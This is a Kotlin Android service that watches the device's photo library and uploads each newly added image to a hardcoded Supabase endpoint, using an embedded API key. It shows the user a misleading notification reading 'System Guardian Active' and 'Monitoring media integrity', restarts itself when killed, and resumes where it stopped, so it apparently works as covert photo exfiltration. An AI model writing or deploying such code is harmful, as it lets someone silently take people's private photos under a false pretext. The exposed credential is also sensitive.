package com.universal.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File

class ImageMonitorService : Service() {
    private val CHANNEL_ID = "ImageMonitorChannel"
    private val SUPABASE_URL = "https://xvldfsmxskhemkslsbym.supabase.co/functions/v1/upload-image"
    private val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"
    
    private lateinit var observer: ContentObserver

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Guardian Active")
            .setContentText("Monitoring media integrity...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        
        startForeground(1, notification)
        startMonitoring()
        recoveryScan()
        return START_STICKY
    }

    private fun recoveryScan() {
        val prefs = getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
        val lastId = prefs.getLong("last_image_id", -1)
        if (lastId != -1L) {
            DebugLogger.log("RECOVERY", "Checking status of image ID: $lastId")
            Uploader.startPolling(this, lastId.toString())
        }
    }

    private var lastEventTime = 0L
    private fun startMonitoring() {
        DebugLogger.log("SERVICE", "Observer initiated on MediaStore")
        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                val now = System.currentTimeMillis()
                if (now - lastEventTime < 2000) return // Debounce duplicate triggers
                lastEventTime = now
                DebugLogger.log("EVENT", "Media change detected")
                processNewImages()
            }
        }
        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, observer)
    }

    private fun processNewImages() {
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        
        contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder)?.use { cursor ->
            if (cursor.moveToFirst()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                
                val prefs = getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
                val lastId = prefs.getLong("last_image_id", -1)

                if (id > lastId) {
                    DebugLogger.log("SCAN", "Found new image: $path")
                    Uploader.uploadFile(this@ImageMonitorService, File(path))
                    prefs.edit().putLong("last_image_id", id).apply()
                }
            }
        }
    }



    private fun createNotificationChannel() {
        val serviceChannel = NotificationChannel(CHANNEL_ID, "Monitor Service", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(serviceChannel)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}